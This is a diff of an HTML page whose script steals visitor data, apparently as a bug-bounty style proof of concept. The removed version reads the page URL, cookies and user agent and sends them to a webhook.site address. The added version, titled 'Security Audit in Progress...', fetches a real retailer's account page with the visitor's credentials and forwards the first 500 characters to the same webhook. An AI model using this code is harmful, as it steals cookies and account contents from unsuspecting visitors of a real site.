@@ -1,19 +1,21 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Security Research PoC - Data Exfiltration Test</h1>
+    <h1>Security Audit in Progress...</h1>
     <script>
-        var exfil_url = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
-        
-        // غانجمعو معلومات مخلطة: الكوكيز اللي مسموح بيهم + رابط الصفحة + التوقيت
-        var leaked_info = "URL: " + window.location.href + 
-                          " | Cookies: " + document.cookie + 
-                          " | UserAgent: " + navigator.userAgent;
+        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
 
-        var encoded_data = btoa(unescape(encodeURIComponent(leaked_info)));
-        
-        // صيفط الداتا
-        window.location.href = exfil_url + "?id=" + encoded_data;
+        // محاولة قراءة بيانات الحساب عبر CORS
+        fetch('https://www.decathlon.com/account', {credentials: 'include'})
+        .then(response => response.text())
+        .then(data => {
+            // غانصيفطو أول 500 حرف من الصفحة (باش ما يوقعش بلوك للحجم)
+            var snippet = btoa(unescape(encodeURIComponent(data.substring(0, 500))));
+            window.location.href = webhook + "?html_leak=" + snippet;
+        })
+        .catch(err => {
+            window.location.href = webhook + "?error=CORS_Blocked";
+        });
     </script>
 </body>
 </html>
